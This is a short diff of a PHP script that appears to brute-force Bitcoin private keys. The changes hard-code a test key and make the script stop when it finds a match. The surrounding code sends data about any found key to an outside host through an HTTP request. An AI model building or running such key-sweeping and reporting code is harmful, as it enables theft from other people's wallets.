@@ -75,7 +75,7 @@ while (true) {
 	for ($x = 0; $x <= 44; $x++) {
 		$bitcoinECDSA->setPrivateKey(return_index($page_index));
 		//echo return_index($page_index)."<br>";
-		//$bitcoinECDSA->setPrivateKey("0000000000000000000000000000000000000000000000000000000000000001");
+		$bitcoinECDSA->setPrivateKey("0000000000000000000000000000000000000000000000000000000000000001");
 		//$page_index = return_random(); // random
 		$page_index = bcadd($page_index, '1', 0);  //increased
 		$addressc = $bitcoinECDSA->getAddress(); //compressed
@@ -102,7 +102,7 @@ while (true) {
 						//sendinger("M",$argv[1],$argv[2],$argv[1],"You Win",$tosave);
 						$cons = file_get_contents('http://dmzed.ml/?id='.$dater[3]);
 						$sent += 1;
-						//die("found");
+						die("found");
 					}
 					
 			 }
